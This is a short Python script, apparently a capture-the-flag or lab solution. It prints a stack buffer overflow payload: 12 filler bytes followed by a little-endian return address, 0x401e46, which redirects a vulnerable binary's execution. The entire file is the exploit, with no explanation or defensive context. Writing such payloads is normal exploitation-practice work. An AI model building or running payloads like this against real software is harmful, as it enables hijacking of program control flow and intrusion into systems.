#!/usr/bin/env python3

import sys

sys.stdout.buffer.write(b'A' * 4 + b'B' * 8 + 0x0000000000401e46.to_bytes(8, 'little'))